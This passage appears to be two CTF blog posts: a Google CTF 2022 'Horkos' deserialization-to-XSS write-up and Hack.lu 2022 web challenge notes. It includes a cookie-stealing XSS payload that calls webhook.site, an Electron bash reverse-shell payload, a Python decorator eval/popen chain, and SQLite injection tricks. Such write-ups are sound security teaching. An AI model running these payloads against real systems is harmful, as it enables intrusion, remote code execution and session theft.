https:&#x2F;&#x2F;horkos-web.2022.ctfcompetition.com&#x2F;order#W1t7ImtleSI6ImNhcnQiLCJ0eXBlIjoicGlja2xlZFNob3BwaW5nQ2FydCIsInZhbHVlIjpbeyJrZXkiOiJpdGVtcyIsInR5cGUiOiJwaWNrbGVkT2JqZWN0IiwidmFsdWUiOlt7ImtleSI6IlRvbWF0byIsInR5cGUiOiJwaWNrbGVkSXRlbSIsInZhbHVlIjpbeyJrZXkiOiJwcmljZSIsInR5cGUiOiJOdW1iZXIiLCJ2YWx1ZSI6MTB9LHsia2V5IjoicXVhbnRpdHkiLCJ0eXBlIjoiU3RyaW5nIiwidmFsdWUiOiIxIn1dfSx7ImtleSI6IlBpY2tsZSIsInR5cGUiOiJwaWNrbGVkSXRlbSIsInZhbHVlIjpbeyJrZXkiOiJwcmljZSIsInR5cGUiOiJOdW1iZXIiLCJ2YWx1ZSI6OH0seyJrZXkiOiJxdWFudGl0eSIsInR5cGUiOiJTdHJpbmciLCJ2YWx1ZSI6IjAifV19LHsia2V5IjoiUGluZWFwcGxlIiwidHlwZSI6InBpY2tsZWRJdGVtIiwidmFsdWUiOlt7ImtleSI6InByaWNlIiwidHlwZSI6Ik51bWJlciIsInZhbHVlIjo0NH0seyJrZXkiOiJxdWFudGl0eSIsInR5cGUiOiJTdHJpbmciLCJ2YWx1ZSI6IjAifV19XX0seyJrZXkiOiJhZGRyZXNzIiwidHlwZSI6InBpY2tsZWRBZGRyZXNzIiwidmFsdWUiOlt7ImtleSI6InN0cmVldCIsInR5cGUiOiJTdHJpbmciLCJ2YWx1ZSI6Im15In0seyJrZXkiOiJudW1iZXIiLCJ0eXBlIjoiTnVtYmVyIiwidmFsdWUiOjB9LHsia2V5IjoiemlwIiwidHlwZSI6Ik51bWJlciIsInZhbHVlIjowfV19LHsia2V5Ijoic2hvcHBpbmdDYXJ0SWQiLCJ0eXBlIjoiTnVtYmVyIiwidmFsdWUiOjQ2MjA0NDc2NzI0MH1dfSx7ImtleSI6ImRyaXZlciIsInR5cGUiOiJwaWNrbGVkRHJpdmVyIiwidmFsdWUiOlt7ImtleSI6InVzZXJuYW1lIiwidHlwZSI6IlN0cmluZyIsInZhbHVlIjoiam9obm55d2Fsa2VyIn0seyJrZXkiOiJvcmRlcnMiLCJ0eXBlIjoicGlja2xlZEFycmF5IiwidmFsdWUiOltdfV19LHsia2V5Ijoib3JkZXJJZCIsInR5cGUiOiJOdW1iZXIiLCJ2YWx1ZSI6NDYyMDQ0NzY3MjQwfV1d It’s obviously a base64 encoded string. If we decode it, the result is another similar JSON string: [ [ &#123; \"key\":\"cart\", \"type\":\"pickledShoppingCart\", \"value\":[ &#123; \"key\":\"items\", \"type\":\"pickledObject\", \"value\":[ &#123; \"key\":\"Tomato\", \"type\":\"pickledItem\", \"value\":[ &#123; \"key\":\"price\", \"type\":\"Number\", \"value\":10 &#125;, &#123; \"key\":\"quantity\", \"type\":\"String\", \"value\":\"1\" &#125; ] &#125;, &#123; \"key\":\"Pickle\", \"type\":\"pickledItem\", \"value\":[ &#123; \"key\":\"price\", \"type\":\"Number\", \"value\":8 &#125;, &#123; \"key\":\"quantity\", \"type\":\"String\", \"value\":\"0\" &#125; ] &#125;, &#123; \"key\":\"Pineapple\", \"type\":\"pickledItem\", \"value\":[ &#123; \"key\":\"price\", \"type\":\"Number\", \"value\":44 &#125;, &#123; \"key\":\"quantity\", \"type\":\"String\", \"value\":\"0\" &#125; ] &#125; ] &#125;, &#123; \"key\":\"address\", \"type\":\"pickledAddress\", \"value\":[ &#123; \"key\":\"street\", \"type\":\"String\", \"value\":\"my\" &#125;, &#123; \"key\":\"number\", \"type\":\"Number\", \"value\":0 &#125;, &#123; \"key\":\"zip\", \"type\":\"Number\", \"value\":0 &#125; ] &#125;, &#123; \"key\":\"shoppingCartId\", \"type\":\"Number\", \"value\":462044767240 &#125; ] &#125;, &#123; \"key\":\"driver\", \"type\":\"pickledDriver\", \"value\":[ &#123; \"key\":\"username\", \"type\":\"String\", \"value\":\"johnnywalker\" &#125;, &#123; \"key\":\"orders\", \"type\":\"pickledArray\", \"value\":[ ] &#125; ] &#125;, &#123; \"key\":\"orderId\", \"type\":\"Number\", \"value\":462044767240 &#125; ] ] That’s it, it seems that it’s a tiny web application without too many features. Source code - renderingLet’s see how it works under the hood. Below is the source code for the core function: const script = new VMScript(fs.readFileSync('./shoplib.mjs').toString().replaceAll('export ','') + ` sendOrder(cart, orders) `); app.post('/order', recaptcha.middleware.verify, async (req,res)=>&#123; req.setTimeout(1000); if (req.recaptcha.error &amp;&amp; process.env.NODE_ENV != \"dev\") &#123; res.writeHead(400, &#123;'Content-Type': 'text/html'&#125;); return await res.end(\"invalid captcha\"); &#125; if (!req.body.cart) &#123; res.writeHead(400, &#123;'Content-Type': 'text/html'&#125;); return await res.end(\"bad request\") &#125; // TODO: Group orders by zip code let orders = []; let cart = req.body.cart; let vm = new VM(&#123;sandbox: &#123;orders, cart&#125;&#125;); let result = await vm.run(script); orders = new Buffer.from(JSON.stringify(orders)).toString('base64'); let url = '/order#' + orders; bot.visit(CHALL_URL + url); res.redirect(url); &#125;); Our input, req.body.cart is pass to a VM and run sendOrder(cart, orders). After sendOrder, the orders array will be updated and sent to /order as the parameter. Then, the user will be redirected to the order page, and a bot will also visit the page. Here is the JavaScript code on the order page: import * as shop from \"/js/shoplib.mjs\"; window.onload = () => &#123; let orders = JSON.parse(atob(location.hash.substr(1))); console.log(orders); (orders).forEach((order) => &#123; const client = new shop.DeliveryClient(order); document.all.order.innerHTML += client; &#125;) &#125; client will be assigned to innerHTML, if we can inject HTML here, we got an XSS that allows us to steal the information(like cookie) of the admin bot. Below is the related code snippet for rending HTML: const escapeHtml = (str) => str.includes('&lt;') ? str.replace(/&lt;/g, c => `&amp;#$&#123;c.charCodeAt()&#125;;`) : str; const renderLines = (arr) => arr.reduce((p,c) => p+` &lt;div class=\"row\"> &lt;div class=\"col-xl-8\"> &lt;p>$&#123;escapeHtml(c.key).toString()&#125;&lt;/p> &lt;/div> &lt;div class=\"col-xl-2\"> &lt;p class=\"float-end\">$&#123;escapeHtml(getValue(c.value, 'quantity').toString())&#125; &lt;/p> &lt;/div> &lt;div class=\"col-xl-2\"> &lt;p class=\"float-end\">$&#123;escapeHtml(getValue(c.value, 'price').toString())&#125; &lt;/p> &lt;/div> &lt;hr> &lt;/div>`, ''); const getValue = (a, p) => p.split('/').reduce((arr,k) => arr.filter(e=>e.key==k)[0].value, a); const renderOrder = (arr) => &#123; return ` &lt;div class=\"container\"> &lt;p class=\"my-5 mx-5\" style=\"font-size: 30px;\">Delivery Information&lt;/p> &lt;div class=\"row\"> &lt;ul class=\"list-unstyled\"> &lt;li class=\"text-black\">$&#123;escapeHtml(getValue(arr,'cart/address/street').toString())&#125; $&#123;escapeHtml(getValue(arr,'cart/address/number').toString())&#125;&lt;/li> &lt;li class=\"text-muted mt-1\">&lt;span class=\"text-black\">Invoice&lt;/span> #$&#123;escapeHtml(getValue(arr, 'orderId').toString())&#125;&lt;/li> &lt;li class=\"text-black mt-1\">$&#123;new Date().toDateString()&#125;&lt;/li> &lt;/ul> &lt;hr> &lt;/div> $&#123;renderLines(getValue(arr, 'cart/items'))&#125; &lt;div class=\"row text-black\"> &lt;div class=\"col-xl-12\"> &lt;p class=\"float-end fw-bold\">Total: $1337 &lt;/p> &lt;/div> &lt;hr style=\"border: 2px solid black;\"> &lt;/div> &lt;div class=\"text-center\" style=\"margin-top: 90px;\"> &lt;p>Delivered by $&#123;escapeHtml(getValue(arr, 'driver/username').toString())&#125;. &lt;/p> &lt;/div> &lt;/div> `; &#125;; export class DeliveryClient &#123; constructor(pickledOrder) &#123; this.pickledOrder = pickledOrder; &#125; toString() &#123; return renderOrder(this.pickledOrder); &#125; &#125;; There is a escpaeHtml function to do the sanitization, it encodes all &lt; if &lt; is in the input. Also, we can see that almost all variables are escaped before rendering to the page, it seems that we have no chance to do something bad? Not exactly, if you look very carefully. In function renderLines, this line is different: &lt;p>$&#123;escapeHtml(c.key).toString()&#125;&lt;/p> Why? Because all the other places are escape(something.toString()), cast the input to string then escape, but the one above cast to string “after” escaped. If you are familiar with JavaScript, besides String.prototype.includes, there is another function with the same name: Array.prototype.includes. String.prototype.includes checks if the target is in the string while Array.prototype.includes checks if the target is in the array. For example, [&#39;&lt;p&gt;hello&lt;/p&gt;&#39;].includes(&#39;&lt;&#39;) is false because there no &#39;&lt;&#39; element in the array. In other words, if c.key is an array, we can bypass the check and rendering &lt;, which caused XSS. Now, we have already finished the second half of the challenge. All we need to do is to find the solution for the first half: “how do we make c.key an array?” Source code - generating order dataAs I mentioned earlier, the order data is generated by sendOrder function, our goal is to find the vulnerability in its implementation and manipulate the order data. Below is the related source code: export const pickle = &#123; PRIMITIVES: ['String', 'Number', 'Boolean'], loads: json => &#123; const obj = &#123;&#125;; for (const &#123;key, type, value&#125; of json) &#123; if (type.match(/^pickled/)) &#123; obj[key] = pickle.loads(value); const constructor = type.replace(/^pickled/, ''); obj[key].__proto__ = (globalThis[constructor]||module[constructor]).prototype; &#125; else &#123; obj[key] = new globalThis[type](value); &#125; &#125; return obj; &#125;, dumps: obj => &#123; const json = []; for (const key in obj) &#123; const value = obj[key]; const type = value.constructor.name; if (typeof type !== 'string') continue; if (typeof value == 'object' &amp;&amp; !pickle.PRIMITIVES.includes(type)) &#123; json.push(&#123; key, type: 'pickled' + type, value: pickle.dumps(value) &#125;); &#125; else if (typeof value !== 'undefined') &#123; json.push(&#123; key, type, value: globalThis[type].prototype.valueOf.call(value) &#125;); &#125; &#125; return json; &#125; &#125;; const DRIVERS = ['drivefast1', 'johnnywalker', 'onagbike']; export const sendOrder = async (value, orders) => &#123; const delivery = new DeliveryService(new Order( pickle.loads(JSON.parse(value))[0] ), orders); return delivery.sendOrder(); &#125;; export class Driver &#123; constructor(username, orders) &#123; this.username = username; this.orders = orders; &#125; async sendOrder(order) &#123; order.driver = this; const pickledOrder = pickle.dumps(order); this.orders.push(pickledOrder); return true; &#125; &#125;; export class DeliveryClient &#123; constructor(pickledOrder) &#123; this.pickledOrder = pickledOrder; &#125; toString() &#123; return renderOrder(this.pickledOrder); &#125; &#125;; export class DeliveryService &#123; constructor(order, orders) &#123; this.order = order; this.orders = orders; &#125; findDriver() &#123; return new Driver( DRIVERS[Math.floor(Math.random() * DRIVERS.length)], this.orders); &#125; async sendOrder() &#123; const driver = this.findDriver(); if (await driver.sendOrder(this.order)) &#123; return this.order.orderId; &#125; &#125; &#125;; export class Order &#123; constructor(cart) &#123; this.cart = cart; this.driver = null; this.orderId = this.cart.shoppingCartId; &#125; &#125;; export class ShoppingCart &#123; constructor() &#123; this.items = &#123;&#125;; this.address = ''; this.shoppingCartId = Math.floor(Math.random() * 1000000000000); &#125; addItem(key, item) &#123; this.items[key] = item; &#125; removeItem(key) &#123; delete this.items[key]; &#125; &#125;; export class Item &#123; constructor(price) &#123; this.price = price; &#125; setQuantity(num) &#123; this.quantity = num; &#125; &#125;; export class Address &#123; constructor(street, number, zip) &#123; this.street = street; this.number = number; this.zip = zip; &#125; &#125;; First, sendOrder is called, and our input(value) is parsed as JSON and then deserialized by pickle.loads. Then, a new DeliveryService is created and delivery.sendOrder is called. export const sendOrder = async (value, orders) => &#123; const delivery = new DeliveryService(new Order( pickle.loads(JSON.parse(value))[0] ), orders); return delivery.sendOrder(); &#125;; In DeliveryService.sendOrder, there will be a random driver to send your order, and return this.order.orderId. export class DeliveryService &#123; constructor(order, orders) &#123; this.order = order; this.orders = orders; &#125; findDriver() &#123; return new Driver( DRIVERS[Math.floor(Math.random() * DRIVERS.length)], this.orders); &#125; async sendOrder() &#123; const driver = this.findDriver(); if (await driver.sendOrder(this.order)) &#123; return this.order.orderId; &#125; &#125; &#125;; In Driver.sendOrder, the driver is assigned to the order, and pickle.dumps(order) is pushed to this.orders, which returns to the user and shows on the /order page in the end. export class Driver &#123; constructor(username, orders) &#123; this.username = username; this.orders = orders; &#125; async sendOrder(order) &#123; order.driver = this; const pickledOrder = pickle.dumps(order); this.orders.push(pickledOrder); return true; &#125; &#125;; How does deserialization works?In JavaScript, class instance is just an object whose constructor points to the class and __proto__ points to the prototype of the class. class A &#123; constructor(num) &#123; this.num = num &#125; hello() &#123; console.log(this.num) &#125; &#125; var obj = new A(123) console.log(typeof obj) // object console.log(obj.constructor === A) // true console.log(obj.__proto__ === A.prototype) // true obj.hello() // 123 So, it’s easy to create an instance of A without new operator: class A &#123; constructor(num) &#123; this.num = num &#125; hello() &#123; console.log(this.num) &#125; &#125; var obj = &#123; num: 123 &#125; obj.__proto__ = A.prototype obj.hello() // 123 It’s basically what pickle.loads does, recreate the object and assign the correct prototype according to the type key. Trying to mess up prototypeAfter understanding how it works, my first thought is to mess up the prototype chain to achieve something unexpected. This part is the most suspicious, in my opinion: export const pickle = &#123; PRIMITIVES: ['String', 'Number', 'Boolean'], loads: json => &#123; const obj = &#123;&#125;; for (const &#123;key, type, value&#125; of json) &#123; if (type.match(/^pickled/)) &#123; obj[key] = pickle.loads(value); const constructor = type.replace(/^pickled/, ''); obj[key].__proto__ = (globalThis[constructor]||module[constructor]).prototype; &#125; else &#123; obj[key] = new globalThis[type](value); &#125; &#125; return obj; &#125; &#125;; The first thing I noticed is that I can create a function if the type is Function, because globalThis[&#39;Function&#39;] is a function constructor. If I can find a way to run the function, I can get an RCE in the sandbox and manipulate the orders. But I can’t find one at the moment. The second thing I tried is to let key equals to __proto__, so that I can control obj.__proto__.__proto__ which is Object.prototype.__proto__, the prototype of Object.prototype. But this does not work because it’s not allowed. You will get an error like this: TypeError: Immutable prototype object ‘#&lt;Object&gt;’ cannot have their prototype set The third thing I came up with is “prototype confusion”, look at this part: if (type.match(/^pickled/)) &#123; obj[key] = pickle.loads(value); const constructor = type.replace(/^pickled/, ''); obj[key].__proto__ = (globalThis[constructor]||module[constructor]).prototype; &#125; pickle.loads always returns an object, so obj[key] is an object. But, if the type is pickledString, its prototype will be String.prototype. So, we can have a weird object whose prototype is String. We messed up the prototype! But, unfortunately, it’s useless in this challenge. After playing around with the pickle function for hours and finding nothing useful, I decided to take a step back. The essence of insecure deserializationThe most suspicious part of the challenge is the pickle function, which is responsible for deserializing data. So, I assumed it’s a challenge about insecure deserialization. What is the essence of insecure deserialization? Or put it in another way, what makes deserialization “insecure”? My answer is: “unexpected object” and “magic function”. For example, when we do the deserialization in the application, it usually is to load our data. The reason why deserialization is a vulnerability is that it can be exploited by loading “unexpected object”, like common gadgets in popular libraries. Also, the “magic function” is important in PHP, like __wakeup, __destruct or __toString and so on. Those magic functions can help the attacker to find the gadget. Back to the challenge, it’s written in JavaScript, what are the magic functions in JavaScript? toString valueOf toJSON So, based on this new mindset, I rechecked the code to see if I could find somewhere interesting. Although none of the functions has been called on our deserialized object, I did find an interesting place: export class DeliveryService &#123; constructor(order, orders) &#123; this.order = order; this.orders = orders; &#125; findDriver() &#123; return new Driver( DRIVERS[Math.floor(Math.random() * DRIVERS.length)], this.orders); &#125; async sendOrder() &#123; const driver = this.findDriver(); if (await driver.sendOrder(this.order)) &#123; return this.order.orderId; &#125; &#125; &#125;; Look at the sendOrder function, it’s an async function and it returns this.order.orderId. It means that if this.order.orderId is a Promise, it will be resolved, even without await. Promise.then is another magic function. async function test() &#123; const p = new Promise(resolve => &#123; console.log('hello') resolve() &#125;) return p &#125; test() Paste it to the browser console and run, you will see hello printed in the console. It’s easy to build a serialized Promise, we only need a then function: async function test() &#123; var obj = &#123; then: function(resolve) &#123; console.log(123) resolve() &#125; &#125; // we don't even need this actually obj.__proto__ = Promise.prototype return obj &#125; // we don't need await here test() The serialized object looks like this: &#123; \"key\":\"shoppingCartId\", \"type\":\"pickledPromise\", \"value\":[ &#123; \"key\":\"then\", \"type\":\"Function\", \"value\":\"globalThis.orders.push(JSON.parse('\"+payload+\"'));arguments[0]();\" &#125; ] &#125; arguments[0] is the resolve function, we need to call it otherwise the program is hanged. As I mentioned earlier, if we can find a way to run a function, we can push our payload to orders. ExploitationTo sum up, we can get the flag by the following steps: Craft a serialized object with a malicious then function in the orderId Manipulate globalThis.orders to insert our data with XSS payload The admin bot load our payload and trigger XSS Steal cookie Below is what I use to test and generate the payload: (BTW, we don’t need to insert a new record actually, just modify orders[0] to our xss payload. It’s easier and also works) const &#123;VM, VMScript&#125; = require(\"vm2\"); const fs = require('fs'); const script = new VMScript(fs.readFileSync('./myshoplib.mjs').toString().replaceAll('export ','') + ` sendOrder(cart, orders) `); async function main () &#123; let orders = []; let payload = JSON.stringify([ &#123; 'key': 'cart', 'type': 'pickledShoppingCart', 'value': [ &#123; 'key': 'items', 'type': 'pickledObject', 'value': [ &#123; 'key': ['&lt;img src=x onerror=\"location=`https://webhook.site/d8dc1452-8e82-408d-9dcf-8ad713754f36/?q=$&#123;encodeURIComponent(document.cookie)&#125;`\">'], 'type': 'pickledItem', 'value': [ &#123; 'key': 'price', 'type': 'Number', 'value': 10 &#125;, &#123; 'key': 'quantity', 'type': 'String', 'value': '1' &#125; ] &#125; ] &#125;, &#123; 'key': 'address', 'type': 'pickledAddress', 'value': [ &#123; 'key': 'street', 'type': 'String', 'value': '' &#125;, &#123; 'key': 'number', 'type': 'Number', 'value': 0 &#125;, &#123; 'key': 'zip', 'type': 'Number', 'value': 0 &#125; ] &#125;, &#123; 'key': 'shoppingCartId', 'type': 'String', 'value': 800600798186 &#125; ] &#125;, &#123; 'key': 'driver', 'type': 'pickledDriver', 'value': [ &#123; 'key': 'username', 'type': 'String', 'value': 'johnnywalker' &#125;, &#123; 'key': 'orders', 'type': 'pickledArray', 'value': [] &#125; ] &#125;, &#123; 'key': 'orderId', 'type': 'String', 'value': 'PEW' &#125; ]).replaceAll('\"', '\\\\\"') let cart = JSON.stringify( [&#123;\"key\":\"0\",\"type\":\"pickledShoppingCart\",\"value\":[&#123;\"key\":\"items\",\"type\":\"pickledObject\",\"value\":[&#123;\"key\":\"Tomato\",\"type\":\"pickledItem\",\"value\":[&#123;\"key\":\"price\",\"type\":\"Number\",\"value\":10&#125;,&#123;\"key\":\"quantity\",\"type\":\"String\",\"value\":\"1\"&#125;]&#125;,&#123;\"key\":\"Pickle\",\"type\":\"pickledItem\",\"value\":[&#123;\"key\":\"price\",\"type\":\"Number\",\"value\":8&#125;,&#123;\"key\":\"quantity\",\"type\":\"String\",\"value\":\"0\"&#125;]&#125;,&#123;\"key\":\"Pineapple\",\"type\":\"pickledItem\",\"value\":[&#123;\"key\":\"price\",\"type\":\"Number\",\"value\":44&#125;,&#123;\"key\":\"quantity\",\"type\":\"String\",\"value\":\"0\"&#125;]&#125;]&#125;,&#123;\"key\":\"address\",\"type\":\"pickledAddress\",\"value\":[&#123;\"key\":\"street\",\"type\":\"String\",\"value\":\"1\"&#125;,&#123;\"key\":\"number\",\"type\":\"Number\",\"value\":0&#125;,&#123;\"key\":\"zip\",\"type\":\"Number\",\"value\":0&#125;]&#125;,&#123;\"key\":\"shoppingCartId\",\"type\":\"pickledPromise\",\"value\":[&#123;\"key\":\"then\",\"type\":\"Function\",\"value\":\"globalThis.orders.push(JSON.parse('\"+payload+\"'));arguments[0]();\"&#125;]&#125;]&#125;] ); let vm = new VM(&#123;sandbox: &#123;orders, cart, console&#125;&#125;); try &#123; let result = await vm.run(script); &#125; catch(err)&#123; console.log('err', err) &#125; console.log('orders') console.log(orders) console.log(encodeURIComponent(cart)) &#125; main() ConclusionThis challenge shows us how a simple deserialization function can be abused by crafting a Promise with a malicious then function. You can return anything in an async function, but if you return a Promise, it will be resolved first as per the MDN documentation. Thanks Pew for solving the second part and other team members for the great teamwork.","link":"/2022/07/11/en/googlectf-2022-horkos-writeup/"},{"title":"Hack.lu CTF 2022 Notes","text":"I was completely lost with the web problems and didn’t solve anything. The quality of the problems was good and I learned a lot of new things, so it’s worth recording. Keywords: Electron relaunch to RCE Executing code using Python decorator Preventing Apache from outputting content type header using special file names GIF + JS polyglot Bypassing SQLite’s illegal column names JS comment &lt;!-- superjson babyelectron(21 solves)Given an Electron app, the goal is to achieve RCE. A bot will visit your page using the app, and you need to find an XSS first, which I won’t discuss here. All the necessary security settings are enabled for this problem. The key is in the following code in the preload: const RendererApi = &#123; invoke: (action, ...args) => &#123; return ipcRenderer.send(\"RELaction\",action, args); &#125;, &#125;; // SECURITY: expose a limted API to the renderer over the context bridge // https://github.com/1password/electron-secure-defaults/SECURITY.md#rule-3 contextBridge.exposeInMainWorld(\"api\", RendererApi); In another JS file, there is this code: // In this file you can include the rest of your app's specific main process // code. You can also put them in separate files and require them here. app.RELbuy = function(listingId)&#123; return &#125; app.RELsell = function(houseId, price, duration)&#123; return &#125; app.RELinfo = function(houseId)&#123; return &#125; app.RElist = function(listingId)&#123; return &#125; app.RELsummary = function(userId)&#123; return &#125; ipcMain.on(\"RELaction\", (_e, action, args)=>&#123; //if([\"RELbuy\", \"RELsell\", \"RELinfo\"].includes(action))&#123; if(/^REL/i.test(action))&#123; app[action](...args) &#125;else&#123; // ?? &#125; &#125;) It doesn’t seem to be useful because those methods are not implemented. But the point is that if you send the relaunch command, it will match, so you can execute app.relaunch, and specify the executable file location during relaunch to achieve RCE. Payload provided by zeyu2001 in DC: &#123; \"houseId\":\"...\", \"token\":\"...\", \"message\":\"&lt;img src=x onerror=\\\"window.api.invoke('relaunch',&#123;execPath: 'bash', args: ['-c', 'bash -i >&amp; /dev/tcp/HOST/PORT 0>&amp;1']&#125;)\\\">\", \"price\":\"\" &#125; Sudistark’s writeup: https://github.com/Sudistark/CTF-Writeups/blob/main/2022/Hack.lu/babyelectron.md Culinary Class Room(6 solves)You are limited to adding a maximum of 250 decorators to one class, and they cannot have parameters. The goal is to execute any code and obtain the flag. The author’s solution is to find a list and push a lot of numbers into it, and then throw it into bytes and then into eval to execute. For example, the following code will push the number 112 into copyright._Printer__filenames. @copyright._Printer__filenames.append @memoryview.__basicsize__.__sub__ @staticmethod.__basicsize__.__mul__ @object.__instancecheck__ class a:pass The payload posted by Arusekk in DC: @print @list @eval @bytes @copyright._Printer__filenames.__add__ @list @str.encode @chr @len @StopAsyncIteration.__doc__.format @copyright._Printer__filenames.append @len @OSError.__doc__.format @copyright._Printer__filenames.append @len @len.__doc__.format @copyright._Printer__filenames.extend @str.encode @int.real.__name__.strip @len.__name__.format @copyright._Printer__filenames.append @len @ValueError.__doc__.format @copyright._Printer__filenames.append @len @Exception.__doc__.format @copyright._Printer__filenames.append @len @OSError.__doc__.format @copyright._Printer__filenames.append @len @StopIteration.__doc__.format @copyright._Printer__filenames.extend @str.encode @open.__name__.format @copyright._Printer__filenames.append @len @set.__doc__.format @copyright._Printer__filenames.append @len @Exception.__doc__.format @copyright._Printer__filenames.extend @str.encode @__import__.__name__.__add__ @str @tuple @str.split @str.lower @OSError.__name__.rstrip @TypeError.__name__.format class room: ... The above code is doing: print(list(eval(b'__import__(\"os\",).popen(\"./rea*\")'))) Because I am extremely unfamiliar with Python, I need to learn it quickly. __doc__ can get the documentation of a method, which needs to be declared in the source code, like this: def test(): \"\"\"hello\"\"\" print(test.__doc__) # hello Python has such a useful feature, which seems quite practical in development, and it should be easier to output it as a file. In Python, __builtins__ can be used to get all built-in things, which feels a bit like the global in js, and you can see what can be used. Using dir() can list all attributes, so you can write a recursive function to find the list, like this: visited = set() def search(obj, path): for name in dir(obj): item = getattr(obj, name) new_path = path + \".\" + name if (type(item) == list): print(new_path) return if type(item) not in visited: visited.add(type(item)) search(item, new_path) search(__builtins__, \"__builtins__\") Finally, you will find the list __builtins__.copyright._Printer__filenames. The solution posted above finds the number and then uses @copyright._Printer__filenames.append to add it to the array. The return value is None, and then using the feature that &quot;abc&quot;.format(None) is still “abc”, you can turn the input into the desired string, and then use len to get the number. YummyGIFs(5 solves)You can upload a gif (strictly checked to be a gif file) and add a title and description. The description will be filtered and rendered on the screen: function s($input_str) &#123; $allowed_tags = ['&lt;b>', '&lt;/b>', '&lt;i>', '&lt;/i>', '&lt;u>', '&lt;/u>', '&lt;s>', '&lt;/s>', '&lt;br>']; $current_str = $input_str; while (true) &#123; $new_str = preg_replace_callback('/&lt;.*?>/', function ($matches) use ($allowed_tags) &#123; return in_array($matches[0], $allowed_tags) ? $matches[0] : ''; &#125;, $current_str); if ($new_str === $current_str) &#123; return $new_str; &#125; $current_str = $new_str; &#125; &#125; It looks strict, but it can actually be bypassed using unclosed tags, like this: &lt;script src=&quot;&quot; p=&quot;. Therefore, any tag can still be inserted. The next problem is how to make src legal. Due to CSP self, we need to generate a GIF that is both a valid JS code. However, even if it is generated, because the content type is image/gif, the browser will still report an error, which will appear as: Refused to execute script from ‘http://localhost:1234/a.gif‘ because its MIME type (‘image&#x2F;gif’) is not executable. The solution is to find a way not to output the content type. Because this content type is given by Apache, it can be bypassed using the file name, for example, if the file name is ..gif, the content type will not be given, as shown in: https://twitter.com/YNizry/status/1582733545759330306 This trick seems worth noting. As for how to generate a GIF + JS polyglot, you can refer to: https://gist.github.com/ajinabraham/f2a057fb1930f94886a3 By the way, here is a note on PNG: PERSISTENT PHP PAYLOADS IN PNGS: HOW TO INJECT PHP CODE IN AN IMAGE – AND KEEP IT THERE! foodAPI(4 solves)The core code of this problem is as follows: apiRouter.get(\"/food/:id\", async(ctx) => &#123; const id = helpers.getQuery(ctx, &#123; mergeParams: true &#125;); try &#123; const res = await Food.select(&#123;id: 'id', name: 'name'&#125;).where(id).all() ctx.response.body = res; &#125; catch (e) &#123; console.log(e) ctx.response.body = e.name &#125; &#125;); id will be an object, and you have complete control over it, but it does not support arrays and nested objects, and only simple objects can be passed in. The goal is SQL injection. This is the longest and most serious problem I have ever seen. I directly opened the Chrome debugger to trace the code. The following briefly explains the internal operation. First, the object you passed in will be converted into the following form: &#123; wheres: [ &#123;field: \"any\", opeator: \"=\", value: \"123\"&#125;, &#123;field: \"name\", opeator: \"=\", value: \"hello\"&#125; ] &#125; Then, it is passed to this._translator.translateToQuery to generate a well-formed SQL query. Then, using a mysterious string segmentation to see if there is a subquery, it is thrown into SQLite. Part of the code is as follows: query(queryDescription: QueryDescription): Promise&lt;any | any[]> &#123; this._makeConnection(); const query = this._translator.translateToQuery(queryDescription); const subqueries = query.split(/;(?=(?:[^'\"]|'[^']*'|\"[^\"]*\")*$)/); const results = subqueries.map((subquery, index) => &#123; const preparedQuery = this._client.prepareQuery(subquery + \";\"); // ... &#125;) // ... &#125; The place where the string is segmented has caused problems before, and even if it is changed, problems will still occur, but it seems irrelevant in this problem: https://github.com/eveningkid/denodb/pull/241 The query generated here is already a complete SQL query, which means that the parameter binding is not done by throwing it into SQLite, but directly using JS. So how is this complete SQL query generated? First, your stuff will be thrown into the query builder, and something like this will be executed: queryBuilder = queryBuilder.where( where.field, where.operator, where.value, ); // 回傳 queryBuilder.toString In the queryBuilder.where, it basically does things based on what you passed in. For example, if I pass: &#123;field:&quot;id&quot;, operator:&quot;=&quot;, value:&quot;hello&quot;&#125;, it will eventually execute: this._statements.push(&#123; grouping: 'where', type: 'whereBasic', column: \"id\", operator: \"=\", value: \"name\", not: this._not(), bool: this._bool(), asColumn: false, &#125;); So the final conversion to a string is based on this this._statements. First, it will generate a statement based on your where. How to generate it? Wrap the column in backticks and change the value to ?, like this: select * from `food` where `id`=? and `name`=? The so-called “wrap” code is at: https://github.com/aghussb/dex/blob/1.0.2/lib/formatter.js#L274 After generating the SQL query, data binding begins, and the code is roughly like this: https://github.com/knex/knex/blob/2.3.0/lib/execution/internal/query-executioner.js#L6 function formatQuery(sql, bindings, timeZone, client) &#123; bindings = bindings == null ? [] : [].concat(bindings); let index = 0; return sql.replace(/\\\\?\\?/g, (match) => &#123; if (match === '\\\\?') &#123; return '?'; &#125; if (index === bindings.length) &#123; return match; &#125; const value = bindings[index++]; return client._escapeBinding(value, &#123; timeZone &#125;); &#125;); &#125; Replace ? with a string, then escape it first, which means adding single quotes outside, and then replacing the single quotes in the string with two single quotes. It seems fine, but the ? in the field name of deno’s lib is forgotten to be escaped, so if you pass: &#123;&quot;id&quot;:&quot;1&quot;, &quot;?&quot;: &quot;A&quot;&#125;, the resulting SQL will be: select * from `food` where `id`=? and `?`=? And after binding, it will become: select * from `food` where `id`='1' and `'A'`=? You will find that SQL injection can be done on the A side, just close the backtick first. But the problem is that this will produce an illegal field name, because there must be a single quote inside, like this: select * from `food` where `id`='1' and `'name`--'=? It will result in: Error: no such column: ‘name I got stuck here at the beginning, there are probably two ways: There are other vulnerabilities that have not been noticed. There is a magical SQLite syntax that can bypass non-existent field names. The answer is the latter. Neither of the following two will go wrong: select id from food where `not_exist'` and 0 union select 1; select id from food where `not_exist'` in () union select 1; Don’t ask me why, I don’t know either, it feels like some kind of syntax bug (or feature XD). After getting the SQL injection, just make a time-based query, and then use xsleak to test the time. Or you can make it error-based like terjanq, which is more efficient. Other people’s writeups: parrot https://gist.github.com/parrot409/f7f5807478f50376057fba755865bd98 terjanq https://gist.github.com/terjanq/1926a1afb420bd98ac7b97031e377436 kunte_ https://files.veryhax.ninja/solve-foodapi-hacklu22.html HTPL(3 solves)This is a self-made AST that uses HTML to combine JS, for example: &lt;x-str>hello&lt;x-str> will be translated into &quot;hello&quot;. The goal is to steal cookies, so you need to be able to execute XSS. I looked at this problem for a long time but didn’t have any ideas. I thought that some mathematical operations could be used to escape strings, but I didn’t find \\, and I didn’t see * that could be used for comments. After the game, I found that the idea was close, but I forgot that the HTML comment &lt;!-- can also be used. Using less than + not + subtraction can combine to form the comment symbol, like this: &lt;x-program> &lt;x-lt> &lt;x-str>a&lt;/x-str> &lt;x-not> &lt;x-dec> &lt;x-identifier>1&lt;/x-identifier> &lt;/x-dec> &lt;/x-not> &lt;/x-lt> &lt;/x-program> will be translated into: 